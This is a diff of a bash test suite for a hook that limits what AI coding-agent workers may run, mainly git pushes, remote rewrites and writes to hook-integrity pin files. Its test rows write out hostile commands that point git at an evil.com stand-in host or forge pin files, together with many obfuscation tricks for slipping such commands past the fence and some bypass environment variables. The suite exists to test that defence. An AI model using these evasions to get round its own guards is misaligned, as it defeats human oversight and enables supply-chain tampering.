-assert_rc "glm mcp qmd get salus-then-himmel via newline (denied)" 2 "$(run_case "$QMD_NEWLINE_FILE" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd multi_get scoped himmel (allowed)" 0 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://himmel/*.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd multi_get mixed scoped+unscoped (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://himmel/a.md,notes.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd multi_get luna referenced (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://luna/*.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# Under nullglob, a glob-bearing non-himmel segment that
-# matches no file must still DENY. The awk-based validation
-# never does pathname expansion at all, so this stays denied unconditionally
-# regardless of nullglob — kept as a regression pin.
-assert_rc "glm mcp qmd multi_get salus glob under nullglob (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://salus/*.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL" "BASHOPTS=nullglob")"
-# A pattern of only empty comma-separated segments
-# (",") must deny. Originally guarded by an explicit zero-iteration counter;
-# now covered directly by the awk validation's NF==0 / empty-field checks
-# — kept as a regression pin.
-assert_rc "glm mcp qmd multi_get comma-only pattern (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":","}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# ROOT CAUSE: bash word-splitting DROPS empty
-# comma-separated fields, so a trailing/leading/adjacent-comma pattern lost
-# its empty segment and was wrongly allowed despite containing one. The awk
-# -F',' replacement preserves empty fields (NF counts them), matching
-# Python's `pattern.split(",")` exactly — these three must all deny.
-assert_rc "glm mcp qmd multi_get trailing comma (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://himmel/a.md,"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd multi_get leading comma (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":",qmd://himmel/a.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm mcp qmd multi_get adjacent commas (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__multi_get","tool_input":{"pattern":"qmd://himmel/a.md,,qmd://himmel/b.md"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# status has no scoping input at all -> denied fail-closed.
-assert_rc "glm mcp qmd status (denied)" 2 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__status","tool_input":{}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-# off-lane: qmd fence does not apply — the pre-existing off-lane mcp allow
-# case above ("off-lane mcp tool") already covers an unscoped qmd call
-# reaching this hook when ANTHROPIC_BASE_URL is not the GLM lane.
-assert_rc "off-lane mcp qmd query unscoped (allowed, off-lane)" 0 "$(run_case '{"tool_name":"mcp__plugin_qmd_qmd__query","tool_input":{}}')"
-assert_rc "glm Read tool ignored"        0 "$(run_case '{"tool_name":"Read","tool_input":{"file_path":"x"}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm empty command"            0 "$(run_case '{"tool_name":"Bash","tool_input":{}}' "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm multi-line prose push"    0 "$(run_case "$(j_bash "$(printf 'git commit -m "notes\nabout git push etiquette"')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# Newlines are command separators (flattened to ';'): a second-line mutation
-# must NOT slip through as an "argument" of the first line.
-assert_rc "glm newline gh smuggle"       2 "$(run_case "$(j_bash "$(printf 'gh pr view 1\ngh pr merge 1')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm newline git push"         2 "$(run_case "$(j_bash "$(printf 'echo hi\ngit push')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# Pinned over-block: quoted prose whose LINE STARTS with a blocked verb.
-assert_rc "glm prose line-start push (pinned overmatch)" 2 "$(run_case "$(j_bash "$(printf 'git commit -m "notes\ngit push later"')")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# gu_shape (the old GLM-lane classifier
-# just above) is command-position-anchored, so a commit MESSAGE mentioning the
-# phrase does not match it. The new anchor-tamper class (i) below is a plain,
-# UNANCHORED substring/keyword scan on purpose (same non-anchored philosophy as
-# the pin-dir class's own pin_text_hit — see that class's header),
-# so it now also fires on this prose. Accepted over-block, same direction as
-# every other "Accepted OVER-blocks" row documented at the top of this file.
-assert_rc "glm prose remote set-url (HIMMEL-2528 accepted overmatch)" 2 "$(run_case "$(j_bash 'git commit -m "docs: note the remote set-url tripwire"')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm prose config url"         0 "$(run_case "$(j_bash 'git commit -m "docs: update config url notes"')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-assert_rc "glm env-prefix push (pinned limitation)" 0 "$(run_case "$(j_bash 'FOO=1 git push')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-
-# --- The GLM-lane TWIN of the anchor class's
-# line-continuation bypass. This lane's cmd_lc uses the same `tr '\n\r' ';;'`
-# and had the identical gap: gp_shape/gu_shape want `git` and the verb in ONE
-# segment, and a `\<newline>` between them became a `;`. Both fences are now
-# fed by the SAME shared join_line_continuations() — one function, because a
-# second copy is exactly how an earlier twin stayed open for a whole round.
-#
-# ISOLATION, checked PER ROW against the hook with ANTHROPIC_BASE_URL removed
-# and HIMMEL_WORKER=1 instead: all four commands below measure rc=0 there, so
-# neither anchor class (i) nor (ii) nor the pin-dir class can produce their
-# verdicts — only this lane's shape matchers can.
-GLM_CONT_PUSH=$(printf 'git \\\npush origin main')
-assert_rc "glm continuation: LF continuation before push" 2 \
-    "$(run_case "$(j_bash "$GLM_CONT_PUSH")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# PARITY, mirrored from the anchor class so the load-bearing sub-decision is
-# pinned on BOTH sides: two trailing backslashes are an escaped literal
-# backslash, the line really ends, and joining there would erase a real
-# boundary — `git push` would stop being command-position and gp_shape would
-# count 0. rc=2 here IS that boundary surviving; the row goes rc=0 when the
-# odd/even test is replaced by "any trailing backslash".
-GLM_CONT_EVEN=$(printf 'echo x\\\\\ngit push origin main')
-assert_rc "glm continuation: an even trailing run keeps the command boundary" 2 \
-    "$(run_case "$(j_bash "$GLM_CONT_EVEN")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# ALLOW control: a continuation inside a harmless command stays allowed, so the
-# DENY row above cannot be satisfied by refusing every backslash-newline.
-GLM_CONT_ECHO=$(printf 'echo checking the lane \\\n  && echo done')
-assert_rc "glm continuation: echo split across a continuation stays allowed" 0 \
-    "$(run_case "$(j_bash "$GLM_CONT_ECHO")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# The join also removes a FALSE DENY, pinned so the direction is on record:
-# split, `gh` counted against gh_shape while gh_allow could not see the
-# `gh issue` carve-out, so this denied. Joined, it reads as the `gh issue list`
-# bash really runs, which is allowed by design. Judging what the shell
-# assembles is the point in both directions.
-GLM_CONT_GH=$(printf 'gh \\\nissue list')
-assert_rc "glm continuation: the gh issue carve-out survives a continuation" 0 \
-    "$(run_case "$(j_bash "$GLM_CONT_GH")" "ANTHROPIC_BASE_URL=$GLM_URL")"
-
-# --- Edge cases: jq availability + malformed input ---
-assert_rc "glm jq missing fails closed"  2 "$(run_case_no_jq "$(j_bash 'git status')")"
+assert_rc "worker config single-quoted insteadOf key" 2 "$(run_case "$(j_bash "git config 'url.https://evil.com/.insteadOf' https://github.com/")" "HIMMEL_WORKER=1")"
+assert_rc "worker config double-quoted insteadOf key" 2 "$(run_case "$(j_bash 'git config "url.https://evil.com/.insteadOf" https://github.com/')" "HIMMEL_WORKER=1")"
+assert_rc "worker config backslash-split insteadOf key" 2 "$(run_case "$(j_bash 'git config ur\l.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
+assert_rc "worker config ANSI-C quoted insteadOf key" 2 "$(run_case "$(j_bash "git config \$'url.https://evil.com/.insteadOf' https://github.com/")" "HIMMEL_WORKER=1")"
+assert_rc "worker config upper-case URL.INSTEADOF key" 2 "$(run_case "$(j_bash 'git config URL.https://evil.com/.INSTEADOF https://github.com/')" "HIMMEL_WORKER=1")"
+assert_rc "worker config set --file value before insteadOf key" 2 "$(run_case "$(j_bash 'git config set --file .git/config url.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
+assert_rc "worker config --type value before insteadOf key" 2 "$(run_case "$(j_bash 'git config --type bool --file .git/config url.https://evil.com/.insteadOf https://github.com/')" "HIMMEL_WORKER=1")"
+assert_rc "worker config ANSI-C hex escape in key" 2 "$(run_case "$(j_bash "git config \$'url.https://evil.com/.\\x69nsteadOf' https://github.com/")" "HIMMEL_WORKER=1")"
+assert_rc "worker git -c ANSI-C escape" 2 "$(run_case "$(j_bash "git -c \$'url.https://evil.com/.\\x69nsteadOf=https://github.com/' fetch")" "HIMMEL_WORKER=1")"
+assert_rc "worker git -c core.pager=cat log allowed" 0 "$(run_case "$(j_bash 'git -c core.pager=cat log')" "HIMMEL_WORKER=1")"
+assert_rc "worker round 6 quoted git + ANSI-C hex key" 2 "$(run_case "$(j_bash "\"git\" config \$'url.x/.\\x69nsteadOf' Y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 6 quoted git + plain key" 2 "$(run_case "$(j_bash '"git" config url.x/.insteadof Y')" "HIMMEL_WORKER=1")"
+assert_rc "worker round 6 split git executable + -c key" 2 "$(run_case "$(j_bash "g''it -c url.x.insteadof=y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 6 git log --oneline allowed" 0 "$(run_case "$(j_bash 'git log --oneline')" "HIMMEL_WORKER=1")"
+assert_rc "worker round 7 octal executable" 2 "$(run_case "$(j_bash "\$'\\147\\151\\164' config url.x.insteadof Y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 7 escaped config subcommand" 2 "$(run_case "$(j_bash "git \$'\\x63onfig' url.x.insteadof Y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 7 split executable g\$'\\x69'\"t\"" 2 "$(run_case "$(j_bash "g\$'\\x69'\"t\" -c url.x.insteadof=y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 7 unterminated ANSI-C segment" 2 "$(run_case "$(j_bash "git config \$'url.x.insteadof Y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 7 NUL octal ends the segment, Of joins" 2 "$(run_case "$(j_bash "git config \$'url.x.instead\\0junk'Of Y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 7 NUL hex ends the segment, Of joins" 2 "$(run_case "$(j_bash "git config \$'url.x.instead\\x00junk'Of Y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 8 single-quoted decoy" 2 "$(run_case "$(j_bash "echo '$' ; git config \$'url.x.\\x69nsteadOf' y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 8 double-quoted decoy" 2 "$(run_case "$(j_bash "echo \"$'\" ; git config \$'url.x.\\x69nsteadOf' y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 9 decoy + split executable" 2 "$(run_case "$(j_bash "echo '$' ; g\$'\\x69't config url.x.insteadOf y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 10 codex-1 NUL via \\c@ ends the segment" 2 "$(run_case "$(j_bash "git config \$'url.x.instead\\c@junk'Of y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 10 codex-2 decoy + two adjacent split segments" 2 "$(run_case "$(j_bash "echo '$' ; g\$'\\x69'\$'\\x74' config url.x.insteadOf y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 10 plain backslash-t inside the key" 2 "$(run_case "$(j_bash "git config url.x.ins\\teadOf y")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 10 plain backslash-r inside url" 2 "$(run_case "$(j_bash "git config remote.origin.u\\rl https://evil")" "HIMMEL_WORKER=1")"
+assert_rc "worker HIMMEL-4032 backslash-newline split insteadOf key" 2 "$(run_case "$(j_bash "$(printf 'command git config url.x.inste\\\nadOf Y')")" "HIMMEL_WORKER=1")"
+# The two rows below are denied by the anchor-tamper ANSI-C arm (`git` + a
+# dollar-quote in its args); pinned so a change to that arm is visible. The codex
+# fence and parity guard pin the ALLOW verdict.
+assert_rc "worker round 7 git commit -m ANSI-C denied by anchor arm (HIMMEL-2528)" 2 "$(run_case "$(j_bash "git commit -m \$'l1\\nl2'")" "HIMMEL_WORKER=1")"
+assert_rc "worker round 7 git log --format=ANSI-C denied by anchor arm (HIMMEL-2528)" 2 "$(run_case "$(j_bash "git log --format=\$'%h\\t%s'")" "HIMMEL_WORKER=1")"
+assert_rc "worker git -c quoted insteadOf one-shot fetch" 2 "$(run_case "$(j_bash "git -c 'url.https://evil.com/.insteadOf=https://github.com/' fetch")" "HIMMEL_WORKER=1")"
+assert_rc "worker config user.name allowed" 0 "$(run_case "$(j_bash 'git config user.name x')" "HIMMEL_WORKER=1")"
+assert_rc "worker remote -v allowed" 0 "$(run_case "$(j_bash 'git remote -v')" "HIMMEL_WORKER=1")"
 assert_rc "native worker jq missing ALSO fails closed (round-3 [codex-1] reversal)" 2 "$(run_case_no_jq_native "$(j_bash 'git status')")"
-assert_rc "glm malformed JSON allows (documented)" 0 "$(run_case '{not json' "ANTHROPIC_BASE_URL=$GLM_URL")"
-
-# --- Escape hatch (expect rc=0 on an otherwise-blocked command) ---
-assert_rc "bypass GLM_EXTERNAL_WRITES_OK" 0 "$(run_case "$(j_bash 'git push')" "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_EXTERNAL_WRITES_OK=1")"
-
-# --- grant-consult cases (escalation channel, spec G1-G12 + plan G13 F9 fast-path) ---
-GRANT_DIR=""
-mk_grants() { GRANT_DIR=$(mktemp -d); printf '%s\n' "$@" > "$GRANT_DIR/grants.jsonl"; }
-# run a cmd on-lane with GLM_SESSION_DIR pointed at the fixture grants dir
-run_case_grant() {
-    local input="$1"; shift
-    printf '%s' "$input" | env -u ANTHROPIC_BASE_URL -u GLM_EXTERNAL_WRITES_OK \
-        "ANTHROPIC_BASE_URL=$GLM_URL" "GLM_SESSION_DIR=$GRANT_DIR" "$@" bash "$HOOK" >/dev/null 2>&1
-    echo "$?"
-}
-# count consumption lines for a grant_id in the fixture. grep -c prints "0" AND
-# exits 1 on zero matches, so a `|| echo 0` would double-emit "0\n0" and break
-# the expect-0 asserts (G13); swallow grep's exit and default a missing file to 0.
-consumptions() { local c; c=$(grep -c "\"type\":\"consumption\",\"grant_id\":\"$1\"" "$GRANT_DIR/grants.jsonl" 2>/dev/null || true); echo "${c:-0}"; }
-
-NOW_FAR="2999-01-01T00:00:00Z"; NOW_PAST="2000-01-01T00:00:00Z"
-GH_API_GET='gh[[:space:]]+api[[:space:]]+repos/o/r([[:space:]]|$)'
-GP_PUSH='git([[:space:]]+-[a-z-]+([[:space:]]+[^[:space:];&|]+)?)*[[:space:]]+push([[:space:]]|$)'
-
-# G1 valid gh-api-GET grant honored + 1 consumption
-mk_grants "{\"type\":\"grant\",\"grant_id\":\"g1\",\"arm\":\"gh\",\"pattern\":\"$GH_API_GET\",\"shape\":\"read\",\"expires_at\":\"$NOW_FAR\",\"max_uses\":3}"
-assert_rc "G1 gh api GET granted"        0 "$(run_case_grant "$(j_bash 'gh api repos/o/r')")"
-assert_rc "G1 consumption appended"      1 "$(consumptions g1)"
-# G2 expired
-mk_grants "{\"type\":\"grant\",\"grant_id\":\"g2\",\"arm\":\"gh\",\"pattern\":\"$GH_API_GET\",\"shape\":\"read\",\"expires_at\":\"$NOW_PAST\",\"max_uses\":3}"
-assert_rc "G2 expired refused"           2 "$(run_case_grant "$(j_bash 'gh api repos/o/r')")"
-# G3 exhausted (max_uses:1 + 1 prior consumption)
-mk_grants "{\"type\":\"grant\",\"grant_id\":\"g3\",\"arm\":\"gh\",\"pattern\":\"$GH_API_GET\",\"shape\":\"read\",\"expires_at\":\"$NOW_FAR\",\"max_uses\":1}" '{"type":"consumption","grant_id":"g3","ts":"2026-01-01T00:00:00Z"}'
-assert_rc "G3 exhausted refused"         2 "$(run_case_grant "$(j_bash 'gh api repos/o/r')")"
-# G4 only-malformed line
-mk_grants '{ not json'
-assert_rc "G4 malformed only fails closed" 2 "$(run_case_grant "$(j_bash 'gh api repos/o/r')")"
-# G5 no GLM_SESSION_DIR at all -> unchanged deny
-assert_rc "G5 no session dir unchanged"  2 "$(run_case "$(j_bash 'git push origin x')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-# G6 compound smuggle: grant covers gh api GET only
-mk_grants "{\"type\":\"grant\",\"grant_id\":\"g6\",\"arm\":\"gh\",\"pattern\":\"$GH_API_GET\",\"shape\":\"read\",\"expires_at\":\"$NOW_FAR\",\"max_uses\":3}"
-assert_rc "G6 compound smuggle blocked"  2 "$(run_case_grant "$(j_bash 'gh api repos/o/r && gh pr merge 1')")"
-# G7 valid git-push grant honored
-mk_grants "{\"type\":\"grant\",\"grant_id\":\"g7\",\"arm\":\"git-push\",\"pattern\":\"$GP_PUSH\",\"shape\":\"write\",\"expires_at\":\"$NOW_FAR\",\"max_uses\":3}"
-assert_rc "G7 git-push granted"          0 "$(run_case_grant "$(j_bash 'git push origin x')")"
-assert_rc "G7 consumption appended"      1 "$(consumptions g7)"
-# G8 two honored calls, max_uses:2 -> both allowed, original line intact, 2 consumptions
-mk_grants "{\"type\":\"grant\",\"grant_id\":\"g8\",\"arm\":\"gh\",\"pattern\":\"$GH_API_GET\",\"shape\":\"read\",\"expires_at\":\"$NOW_FAR\",\"max_uses\":2}"
-ORIG_G8=$(head -1 "$GRANT_DIR/grants.jsonl")
-assert_rc "G8 call 1"                    0 "$(run_case_grant "$(j_bash 'gh api repos/o/r')")"
-assert_rc "G8 call 2"                    0 "$(run_case_grant "$(j_bash 'gh api repos/o/r')")"
-assert_rc "G8 original grant byte-unchanged" 0 "$([ "$(head -1 "$GRANT_DIR/grants.jsonl")" = "$ORIG_G8" ] && echo 0 || echo 1)"
-assert_rc "G8 two consumptions"          2 "$(consumptions g8)"
-# G9 off-lane: grant never read. Feed stdin via a herestring, NOT a pipe — off
-# lane the hook exits at the ANTHROPIC_BASE_URL check before reading stdin, so a
-# pipe writer would take SIGPIPE (rc 141 under pipefail); a herestring has no
-# live writer to signal.
-mk_grants "{\"type\":\"grant\",\"grant_id\":\"g9\",\"arm\":\"gh\",\"pattern\":\"$GH_API_GET\",\"shape\":\"read\",\"expires_at\":\"$NOW_FAR\",\"max_uses\":3}"
-G9_IN="$(j_bash 'gh api repos/o/r')"
-assert_rc "G9 off-lane grant ignored"    0 "$(env -u ANTHROPIC_BASE_URL "GLM_SESSION_DIR=$GRANT_DIR" bash "$HOOK" >/dev/null 2>&1 <<<"$G9_IN"; echo $?)"
-# G10 overlap grant does NOT credit sibling merge (single-alternation, F1)
-mk_grants "{\"type\":\"grant\",\"grant_id\":\"g10\",\"arm\":\"gh\",\"pattern\":\"gh[[:space:]]+pr[[:space:]]+view([[:space:]]|$)\",\"shape\":\"read\",\"expires_at\":\"$NOW_FAR\",\"max_uses\":3}"
-assert_rc "G10 overlap no-credit"        2 "$(run_case_grant "$(j_bash 'gh pr view 1 && gh pr merge 1')")"
-# G11 one malformed + one valid covering grant -> honored (F7)
-mk_grants '{ bad line' "{\"type\":\"grant\",\"grant_id\":\"g11\",\"arm\":\"gh\",\"pattern\":\"$GH_API_GET\",\"shape\":\"read\",\"expires_at\":\"$NOW_FAR\",\"max_uses\":3}"
-assert_rc "G11 bad line skipped, valid honored" 0 "$(run_case_grant "$(j_bash 'gh api repos/o/r')")"
-assert_rc "G11 consumption appended"     1 "$(consumptions g11)"
-# G12 git-push grant whose pattern matches only benign git status (no push) -> REJECTED by gate (F8)
-mk_grants "{\"type\":\"grant\",\"grant_id\":\"g12\",\"arm\":\"git-push\",\"pattern\":\"git[[:space:]]+status\",\"shape\":\"write\",\"expires_at\":\"$NOW_FAR\",\"max_uses\":3}"
-assert_rc "G12 non-push-anchored rejected" 2 "$(run_case_grant "$(j_bash 'git status && git push origin x')")"
-# G13 F9 fast path: builtin-allowed command + valid UNRELATED grant present -> rc=0 AND grant neither consulted nor consumed
-mk_grants "{\"type\":\"grant\",\"grant_id\":\"g13\",\"arm\":\"git-push\",\"pattern\":\"$GP_PUSH\",\"shape\":\"write\",\"expires_at\":\"$NOW_FAR\",\"max_uses\":3}"
-assert_rc "G13 builtin-allowed fast path"       0 "$(run_case_grant "$(j_bash 'gh pr view 1')")"
-assert_rc "G13 fast path did not consume grant" 0 "$(consumptions g13)"
+assert_rc "worker malformed JSON allows (documented)" 0 "$(run_case '{not json' "HIMMEL_WORKER=1")"
 
 # --- hook-integrity pin-dir write-fence (worker-ness, not lane) --
-# The pin-dir class is the ONLY class in this file gated on worker_lane
-# (glm_lane OR HIMMEL_WORKER=1) instead of glm_lane alone — see the header's
-# GENERALIZATION note. These cases pin: (a) a headed/off-lane
-# session stays unaffected, (b) a native (non-GLM) dispatched worker is now
-# denied — closing the exact gap the ticket was filed for, (c) GLM-lane
-# behavior for this NEW class is the same deny, (d) the documented bypass
-# works, and (e) a native worker gets ONLY this class, not the rest of the
-# GLM-specific enforcement (scope boundary, not a regression).
+# The pin-dir class is gated on HIMMEL_WORKER=1 alone. These cases pin: (a) a
+# headed/off-lane session stays unaffected, (b) a dispatched worker is denied,
+# (c) the documented bypass works, and (d) the fence is only these two classes,
+# not a push/gh/network classifier (scope boundary, not a regression).
 PIN_FIXTURE=$(mktemp -d -t hook-integrity.XXXXXX)
 PIN_FIXTURE_NATIVE=$(native_dir "$PIN_FIXTURE")
 PIN_WRITE_CMD="echo pwned > $PIN_FIXTURE/forged-session.json"
@@ -1000,7 +355,7 @@ assert_rc "pin-dir write denied via 6 distinct cds overflowing MAXCAND (HIMMEL-2
 # The fork model SUBSUMES it -- a cd forks rather than replaces, and a
 # cd skipped by short-circuit is indistinguishable from a cd that ran and
 # failed, which is exactly the preserved unchanged candidate. Verified
-# both-direction against `git show 2bab2305:scripts/hooks/block-glm-external-writes.sh`
+# both-direction against `git show 2bab2305:scripts/hooks/block-worker-write-fence.sh`
 # (ALLOWS this shape) vs today (DENIES it); this case pins the behaviour so a
 # future narrowing of the fork model cannot silently reopen it.
 PIN_SHORTCIRCUIT_DIR=$(mktemp -d -t pin-shortcircuit.XXXXXX)
@@ -1322,34 +677,22 @@ PIN_HOME_CMD='echo pwned > "$HOME/.claude/himmel/hook-integrity/forged.json"'
 assert_rc "pin-dir write denied via unexpanded \$HOME default-path reference (codex-1)" 2 \
     "$(run_case "$(j_bash "$PIN_HOME_CMD")" "HIMMEL_WORKER=1")"
 
-assert_rc "pin-dir write denied on the GLM lane too (new class extends it)" 2 \
-    "$(run_case "$(j_bash "$PIN_WRITE_CMD")" "ANTHROPIC_BASE_URL=$GLM_URL" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
-
 # The bypass is honoured only inside a linked worktree of the
-# session's recorded repo (positive controls: test-block-glm-bypass-scope.sh);
+# session's recorded repo (positive controls: test-block-worker-bypass-scope.sh);
 # this suite runs from the primary/CI checkout, where it must NOT disable the fence.
 assert_rc "pin-dir write STILL denied under the bypass outside a linked worktree (HIMMEL-3396)" 2 \
     "$(run_case "$(j_bash "$PIN_WRITE_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE" "HIMMEL_HOOK_INTEGRITY_BYPASS_OK=1")"
 
-# Scope boundary: a native worker gets ONLY the pin-dir class. The rest of
-# this file's GLM-specific enforcement (push/gh/network) does not extend to
-# it — the pin-dir class covers the hook-integrity surface, not a full GLM-lane
-# replica for native workers.
+# Scope boundary: a worker gets ONLY the pin-dir and anchor-tamper classes; no
+# push/gh/network classifier exists here any more.
 assert_rc "native worker git push NOT blocked by this hook (out of HIMMEL-2085 scope)" 0 \
     "$(run_case "$(j_bash 'git push origin main')" "HIMMEL_WORKER=1")"
 assert_rc "native worker unrelated command allowed" 0 \
     "$(run_case "$(j_bash 'git status')" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
-# GLM lane's pre-existing enforcement is unchanged by this generalization.
-assert_rc "glm lane git push still blocked (regression pin)" 2 \
-    "$(run_case "$(j_bash 'git push origin main')" "ANTHROPIC_BASE_URL=$GLM_URL")"
-
 # --- anchor-tamper fence (origin/<default> repoint) -------------
-# Every DENY row below runs on a NATIVE worker lane (HIMMEL_WORKER=1, no
-# ANTHROPIC_BASE_URL) — the exact case cmd_lc (set only past the glm_lane-only
-# exit at :877 in the pre-2528 file) cannot reach, and a row that only
-# exercised the GLM lane would be vacuous for this class's whole reason to
-# exist (worker-ness, not lane — same as the pin-dir class above).
+# Every DENY row below runs on a dispatched worker (HIMMEL_WORKER=1) — worker-ness,
+# not lane, same as the pin-dir class above.
 assert_rc "anchor-tamper: local-path fetch with a bare refspec" 2 \
     "$(run_case "$(j_bash 'git fetch . x:origin/main')" "HIMMEL_WORKER=1")"
 assert_rc "anchor-tamper: local-path fetch with a HEAD:refs/remotes refspec" 2 \
@@ -1703,9 +1046,8 @@ assert_rc "class (i) ANSI-C: non-git command using \$'...' allowed" 0 \
 # ACCEPTED OVERMATCH, pinned as the two rows that CHANGED DIRECTION
 # (rc=0 ALLOW pre-fix, rc=2 DENY now). Recorded honestly rather than argued
 # away: class (i) is an unanchored substring scan, so a commit MESSAGE naming a
-# fenced phrase already denied before this change — see the "glm prose remote
-# set-url" accepted-overmatch row near the top of this file, which
-# pins the UNQUOTED spelling at rc=2 and predates the change. Normalization
+# fenced phrase already denied before this change in its UNQUOTED spelling.
+# Normalization
 # extends that same accepted cost to the quoted spelling; it does not create a
 # new category of false positive, and no substring class can tell
 # `git remote 'add' evil` from `-m "remote 'add'"` without being scoped to a
@@ -1809,7 +1151,7 @@ assert_rc "class (i) ANSI-C: quoted git without \$'...' allowed" 0 \
 # `remotes/origin/`, `symbolic-ref`, `update-ref`, `insteadof` or
 # `remote.origin.url` (no other class-(i) keyword can fire), and run_case
 # unsets HIMMEL_HOOK_INTEGRITY_DIR and ANTHROPIC_BASE_URL (neither the pin-dir
-# class nor the GLM-lane arms can fire). The ONLY thing that can produce rc=2
+# class nor any other arm can fire). The ONLY thing that can produce rc=2
 # is the remote-verb tokeniser reading a continuation-joined command.
 ANCHOR_CR=$(printf '\r')
 ANCHOR_CONT_SETURL=$(printf 'git remote \\\nset-url origin /tmp/evil.git')
@@ -1867,7 +1209,7 @@ assert_rc "anchor-tamper: DENY-shaped command allowed off-lane (headed session)"
     "$(run_case "$(j_bash 'git fetch . x:origin/main')")"
 
 # The bypass no longer lets a DENY-shaped command through outside a
-# linked worktree (positive controls: test-block-glm-bypass-scope.sh).
+# linked worktree (positive controls: test-block-worker-bypass-scope.sh).
 assert_rc "anchor-tamper: DENY-shaped command STILL denied under the bypass outside a linked worktree (HIMMEL-3396)" 2 \
     "$(run_case "$(j_bash 'git fetch . x:origin/main')" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_BYPASS_OK=1")"
 
@@ -1880,7 +1222,7 @@ fi
 # means a case was silently dropped (or an early exit skipped the tail) even
 # though nothing FAILED. Update EXPECTED_CASES deliberately when adding/
 # removing a case.
-EXPECTED_CASES=418   # +9: HIMMEL-4225 CR round 1 rows (8 DENY: empty/unusual heredoc delimiters and an arithmetic << before evasion 1; 1 ALLOW empty-delimiter control) && +3: HIMMEL-4225 rows (2 DENY: a stray apostrophe in a comment or a heredoc body before evasion 1; 1 ALLOW comment control) && +3: HIMMEL-4032 rows (2 DENY: dollar-quote + plain-escape key behind `command`, continuation-split key; 1 ALLOW user.name control) && +1: HIMMEL-844 round 11 padded pushurl E2BIG DENY row && +2: HIMMEL-844 round 10 plain-text escapes (raw third stream) && +2: HIMMEL-844 round 10 NUL-via-\c@ and decoy + two split segments DENY rows (flat decode) && +2: HIMMEL-844 round 9 decoy + split-executable DENY rows && +3: HIMMEL-844 round 8 decoy dollar-quote DENY rows && +2: HIMMEL-844 round 7 NUL ends the ANSI-C segment (octal and hex DENY rows) && +6: HIMMEL-844 round 7 finite ANSI-C decoder (5 DENY escaped-executable/octal/escaped-subcommand/split/unterminated, 2 commit -m / log --format dollar-quote rows pinned DENY by the HIMMEL-2528 anchor arm; replaces the round 6 pinned overmatch row) && +4: HIMMEL-844 round 6 blunt substring rule (5 rows: 3 DENY quoted/split git spellings, 1 ALLOW git log --oneline, 1 DENY pinned overmatch; minus the dropped `$i` row) && +6: HIMMEL-844 round 5 position-free rows (5 DENY: --file/--type value before key, ANSI-C hex key, ANSI-C git -c, $-hidden suffix; 1 ALLOW git -c core.pager) && +6: HIMMEL-844 round 3 dequote rows (single/double/backslash/ANSI-C/upper-case key + quoted git -c) && +9: HIMMEL-844 insteadOf rows (6 DENY incl. git -c and --config-env one-shots, 2 ALLOW controls) && +6: HIMMEL-3177 awk NUL-fallback marker guard (4 DENY rows incl. the `u{1} rebuild, 2 controls) +69: HIMMEL-2085 pin-dir write-fence + scope-boundary cases (+3 codex-1 var-expansion fix, +4 round-2 codex-1/2/3 fixes, +4 round-4 codex-1 script-indirection fix, +5 round-5 codex-1/2 direct-exec/dash-option/quoted-path/node fixes, +2 round-5 re-review 